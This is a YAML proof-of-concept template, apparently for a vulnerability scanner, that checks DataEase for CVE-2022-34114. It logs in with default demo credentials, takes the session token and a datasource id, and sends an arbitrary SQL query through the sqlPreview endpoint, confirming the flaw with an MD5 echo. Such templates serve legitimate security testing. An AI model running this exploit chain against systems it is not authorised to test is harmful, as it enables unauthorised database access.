name: poc-yaml-dataease-cve-2022-34114
manual: true
transport: http
set:
    randNum: randomInt(1000, 9999)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /api/auth/login
            headers:
                Content-Type: application/json
            body: |
                {"username":"demo","password":"cjab9Eu0dkS5Veh/sqghbg33Qa/xnqBolObRpJLqeDetgR8quuGlCuvUWjq0sFtle9HYgC1ztMFUFd/rnp11Ug==","loginType":0}
        expression: response.status == 200 && response.body.bcontains(b"success") && response.body.bcontains(b"true")
        output:
            search: |
                "\"token\":\"(?P<token>[ \\. | \\- | \\w]+)\"".bsubmatch(response.body)
            token: search["token"]
    r1:
        request:
            cache: true
            method: GET
            path: /datasource/list/
            headers:
                Authorization: '{{token}}'
                Content-Type: application/json
        expression: response.status == 200 && response.body.bcontains(b"success") && response.body.bcontains(b"true")
        output:
            search: |
                "\"id\":\"(?P<id>[ \\- | \\w]+)\"".bsubmatch(response.body)
            dataSourceId: search["id"]
    r2:
        request:
            cache: true
            method: POST
            path: /dataset/table/sqlPreview/
            headers:
                Authorization: '{{token}}'
                Content-Type: application/json
            body: |
                {"dataSourceId": "{{dataSourceId}}","type":"sql", "info": "{\"sql\": \"select md5({{randNum}})\"}"}
        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(randNum))))
expression: r0() && r1() && r2()
detail:
    author: Naraku
    links:
        - https://github.com/dataease/dataease/issues/2430
    vulnerability:
        id: CT-458169
        level: high
